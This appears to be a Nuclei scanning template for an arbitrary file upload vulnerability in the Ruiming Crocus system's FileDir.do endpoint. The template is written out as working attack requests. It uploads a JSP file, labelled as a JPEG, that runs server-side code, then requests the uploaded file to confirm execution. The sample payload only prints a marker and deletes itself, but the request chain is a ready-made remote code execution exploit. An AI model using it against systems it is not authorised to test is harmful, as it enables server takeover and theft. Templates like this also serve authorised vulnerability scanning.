id: ruiming-Crocus-FileDir_do-File-upload

info:
  name: 锐明技术Crocus系统 FileDir.do 任意文件上传漏洞
  author: ruiming
  severity: high
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列

http:
  - raw:
      - |
        POST /FileDir.do?Action=Upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj

        ------WebKitFormBoundaryFfJZ4PlAZBixjELj
        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
        Content-Type: image/jpeg

        <% out.println("sectestsectest"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
        ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
    extractors:
       - type: regex 
         part: body
         name: uploadfile
         group: 1
         regex:
           - '((\d+)\.jsp)'
         internal: true
  - raw:
      - |
        GET /Plugin/FileManage/Temp/{{uploadfile}} HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'sectestsectest'
      - type: status
        status: 
          - 200